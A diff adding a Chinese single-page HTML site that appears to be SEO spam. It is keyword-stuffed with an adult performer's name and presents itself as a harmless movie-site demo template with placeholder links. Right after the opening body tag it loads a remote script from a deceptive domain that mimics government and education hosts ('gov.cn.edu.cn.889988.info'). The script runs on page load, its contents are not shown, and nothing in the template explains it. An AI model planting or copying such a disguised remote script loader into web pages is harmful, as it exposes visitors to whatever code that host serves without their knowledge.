@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>苍井空电影网 | 电影资讯与片库示例站</title>
+  <meta name="description" content="苍井空电影网（cangjingkongdianyingwang-app）是电影资讯、片库展示与影评内容示例站，提供移动端自适应单页浏览体验。" />
+  <meta name="keywords" content="苍井空电影网, cangjingkongdianyingwang-app, 电影网, 电影资讯, 片库" />
+  <style>
+    :root {
+      --bg: #0b0f1a;
+      --card: rgba(255, 255, 255, 0.06);
+      --line: rgba(255, 255, 255, 0.12);
+      --neon: #6df3ff;
+      --neon2: #ff6ec7;
+      --text: #e8ecf5;
+      --muted: #9aa6c0;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
+      background:
+        radial-gradient(1200px 600px at 10% -10%, rgba(109, 243, 255, 0.18), transparent 60%),
+        radial-gradient(1000px 500px at 110% 10%, rgba(255, 110, 199, 0.16), transparent 55%),
+        var(--bg);
+      color: var(--text);
+      line-height: 1.65;
+      min-height: 100vh;
+    }
+
+    a {
+      color: var(--neon);
+      text-decoration: none;
+    }
+
+    .wrap {
+      width: min(1080px, 92vw);
+      margin: 0 auto;
+    }
+
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      backdrop-filter: blur(14px);
+      background: rgba(11, 15, 26, 0.72);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 0;
+      gap: 12px;
+    }
+
+    .logo {
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      font-size: 20px;
+      background: linear-gradient(90deg, var(--neon), var(--neon2));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .menu {
+      display: flex;
+      gap: 18px;
+      flex-wrap: wrap;
+    }
+
+    .menu a {
+      color: var(--muted);
+      font-size: 15px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      transition: 0.25s;
+    }
+
+    .menu a:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    section {
+      padding: 72px 0;
+      border-bottom: 1px solid var(--line);
+    }
+
+    h1 {
+      font-size: clamp(34px, 6vw, 58px);
+      line-height: 1.15;
+      margin-bottom: 18px;
+    }
+
+    h2 {
+      font-size: clamp(26px, 4vw, 36px);
+      margin-bottom: 18px;
+    }
+
+    p {
+      color: var(--muted);
+      max-width: 720px;
+    }
+
+    .pill {
+      display: inline-block;
+      padding: 6px 14px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      font-size: 13px;
+      color: var(--neon);
+      margin-bottom: 18px;
+    }
+
+    .url-box {
+      margin-top: 22px;
+      padding: 14px 18px;
+      border: 1px dashed var(--neon2);
+      border-radius: 14px;
+      background: rgba(255, 110, 199, 0.08);
+      font-size: 15px;
+      word-break: break-all;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px;
+      margin-top: 28px;
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 22px;
+      transition: 0.3s;
+    }
+
+    .card:hover {
+      transform: translateY(-4px);
+      border-color: var(--neon);
+      box-shadow: 0 20px 60px rgba(109, 243, 255, 0.12);
+    }
+
+    .card h3 {
+      font-size: 19px;
+      margin-bottom: 10px;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 26px;
+      padding: 12px 26px;
+      border-radius: 999px;
+      font-weight: 700;
+      color: #04121a;
+      background: linear-gradient(90deg, var(--neon), var(--neon2));
+    }
+
+    .news-list {
+      margin-top: 22px;
+      display: grid;
+      gap: 14px;
+    }
+
+    .news-item {
+      padding: 16px 18px;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    .news-item span {
+      font-size: 13px;
+      color: var(--neon);
+    }
+
+    footer {
+      padding: 40px 0 60px;
+      color: var(--muted);
+      font-size: 14px;
+      text-align: center;
+    }
+
+    @media (max-width: 860px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+      .menu {
+        gap: 10px;
+      }
+      .nav {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+  <header>
+    <div class="wrap nav">
+      <div class="logo">苍井空电影网</div>
+      <nav class="menu">
+        <a href="#home">首页</a>
+        <a href="#about">关于</a>
+        <a href="#library">片库</a>
+        <a href="#news">资讯</a>
+        <a href="#contact">联系</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <!-- 栏目 1：首页 -->
+    <section id="home">
+      <div class="wrap">
+        <span class="pill">单页示例站 · 移动端自适应</span>
+        <h1>苍井空电影网<br />电影内容与资讯展示页</h1>
+        <p>
+          苍井空电影网是一个用于演示的单页网站，展示电影分类、影片资讯、影评内容和联系方式。
+          页面采用 CSS + DIV 布局，结构清晰，适合搜索引擎理解页面主题。
+        </p>
+
+        <div class="url-box">
+          官方网址：https://cangjingkongdianyingwang-app
+        </div>
+
+        <a class="btn" href="#library">进入片库示例</a>
+      </div>
+    </section>
+
+    <!-- 栏目 2：关于 -->
+    <section id="about">
+      <div class="wrap">
+        <h2>关于苍井空电影网</h2>
+        <p>
+          苍井空电影网（cangjingkongdianyingwang-app）定位于电影内容聚合示例站，
+          提供影片分类、简介展示、更新动态与用户反馈入口。本页仅作前端模板演示，
+          所有内页链接均使用 # 占位。
+        </p>
+        <div class="grid">
+          <div class="card">
+            <h3>内容分类</h3>
+            <p>剧情、动作、悬疑、爱情、纪录片等分类展示。</p>
+          </div>
+          <div class="card">
+            <h3>移动优先</h3>
+            <p>页面适配手机、平板与桌面端，触控区域清晰。</p>
+          </div>
+          <div class="card">
+            <h3>SEO 结构</h3>
+            <p>使用 h1/h2、description、语义区块，利于必应收录。</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目 3：片库 -->
+    <section id="library">
+      <div class="wrap">
+        <h2>片库示例</h2>
+        <p>以下为示例卡片，点击封面或标题可跳转到 # 占位链接。</p>
+        <div class="grid">
+          <div class="card">
+            <h3>夜色剧场</h3>
+            <p>悬疑 / 剧情 · 示例影片简介内容。</p>
+            <a href="#">查看详情 »</a>
+          </div>
+          <div class="card">
+            <h3>城市边缘</h3>
+            <p>动作 / 犯罪 · 示例影片简介内容。</p>
+            <a href="#">查看详情 »</a>
+          </div>
+          <div class="card">
+            <h3>海风来信</h3>
+            <p>爱情 / 文艺 · 示例影片简介内容。</p>
+            <a href="#">查看详情 »</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目 4：资讯 -->
+    <section id="news">
+      <div class="wrap">
+        <h2>电影资讯</h2>
+        <div class="news-list">
+          <div class="news-item">
+            <span>2026-10-02</span>
+            <h3>苍井空电影网更新示例片单</h3>
+            <p>本站新增剧情片与纪录片示例分类，方便单页展示。</p>
+          </div>
+          <div class="news-item">
+            <span>2026-09-28</span>
+            <h3>移动端浏览体验优化</h3>
+            <p>页面重构为响应式布局，手机端无需横向滚动。</p>
+          </div>
+          <div class="news-item">
+            <span>2026-09-20</span>
+            <h3>必应收录说明</h3>
+            <p>单页站通过标题、描述、关键词与清晰结构提升可索引性。</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目 5：联系 -->
+    <section id="contact">
+      <div class="wrap">
+        <h2>联系我们</h2>
+        <p>
+          如果你对“苍井空电影网”示例站有模板修改需求，可以通过下方占位入口联系。
+          当前为单页演示，不提交真实表单。
+        </p>
+        <div class="grid">
+          <div class="card">
+            <h3>商务合作</h3>
+            <p><a href="#">合作示例链接</a></p>
+          </div>
+          <div class="card">
+            <h3>内容投稿</h3>
+            <p><a href="#">投稿示例链接</a></p>
+          </div>
+          <div class="card">
+            <h3>意见反馈</h3>
+            <p><a href="#">反馈示例链接</a></p>
+          </div>
+        </div>
+
+        <div class="url-box">
+          访问地址：https://cangjingkongdianyingwang-app
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      © 2026 苍井空电影网（示例站） · 网址：https://cangjingkongdianyingwang-app · 本页所有内链均使用 # 占位
+    </div>
+  </footer>
+</body>
+</html>
